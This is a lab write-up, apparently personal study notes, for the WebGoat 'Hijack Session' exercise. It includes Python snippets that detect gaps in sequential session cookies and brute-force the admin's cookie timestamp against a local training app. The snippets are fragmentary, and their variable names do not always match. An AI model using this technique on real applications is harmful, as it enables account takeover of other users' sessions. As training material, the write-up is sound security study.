
# Hijack Session
***
## Concept
Application developers who develop their own session IDs frequently forget to incorporate the complexity and randomness necessary for security. If the user specific session ID is not complex and random, then the application is highly susceptible to session-based brute force attacks.

## Goals
Gain access to an authenticated session belonging to someone else.
***
We can see that there's a login panel here
![[OWASP_top_10/IMG/Pasted image 20230916131425.png]]
and the hint says:
![[OWASP_top_10/IMG/Pasted image 20230916131527.png]]
![[OWASP_top_10/IMG/Pasted image 20230916131542.png]]
![[OWASP_top_10/IMG/Pasted image 20230916131553.png]]

when we login with the authentic user:
![[OWASP_top_10/IMG/Pasted image 20230916131715.png]]
We take the request in the repeater....we can see that the hijack cookie is being assigned:
![[OWASP_top_10/IMG/Pasted image 20230916131930.png]]
we send multiple requests and see the changes:
![[OWASP_top_10/IMG/Pasted image 20230916132402.png]]
there are few numbers missing in btw like 91 , 95 , also the hint says:
![[OWASP_top_10/IMG/Pasted image 20230916132452.png]]
so when we login , in between the admin also logins , so we need to hijack that session , But here’s the catch : we need to change the second part of the cookie too : the time stamp , so how do we do that?
So I wrote a code for this:
* first we send a request for the application so that it assigns us the cookie
```python
response = requests.post(f"http://localhost:8080/WebGoat/HijackSession/login/?username={username}&password={password}",headers={"Cookie":f"JSESSIONID={JSESSIONID}"},)
```
* now if the app assigns us the hijack cookie value , then set the session with the cookie
```
	current_session = None;
	for cookie in response.cookies:
		# now we need to look for the hijack cookie in the response:
		if cookie.name == "hijack_cookie":
			current_session = cookie.value
```
* repeat the process until we get a cookie with the difference of 2 in the first part , and take account of the admin cookie into a variable , also note the cookie start and end time -> why so that we can predict the timestamp also which is the 2nd part of the cookie
```python
if previous_session_ID:
		# then check for if there's a difference of 2:
		if current_session_ID - previous_session_ID == 2:
			print(f"{'[+]'*5} This is the admin session: {previous_session_ID+1} {'[+]'*5}",end="\n")
			session_found = previous_session_ID+1
			# now we need to record the time where we found
			session_found_start_time = previous_session_timestamp
			session_found_end_time = current_session_timestamp
			break
```
* Now when we have all the data we start a loop that will send each and every request to the server with the cookie and the timestamp , since we know the range , we can try every timestamp in that range
```python
for timestamp in range(session_found_start_time, session_found_end_time+1):
    # we will craft a request that will have that cookie of the admin
    response = requests.post(f"http://localhost:8080/WebGoat/HijackSession/login/?username={username}&password={password}",headers={"Cookie":f"JSESSIONID={JSESSIONID}; hijack_cookie={session_found_ID}-{timestamp};secure;"},)
    # we now print the response's that part which shows us if we succeeded or not
    feedback=response.text.split("feedback: ")[-1].strip()
    print(f"{session_found_ID}-{timestamp}: {feedback}")
```

# IDOR
since this is being referrenced by the object that is insecure
![[OWASP_top_10/IMG/Pasted image 20230815152058.png]]
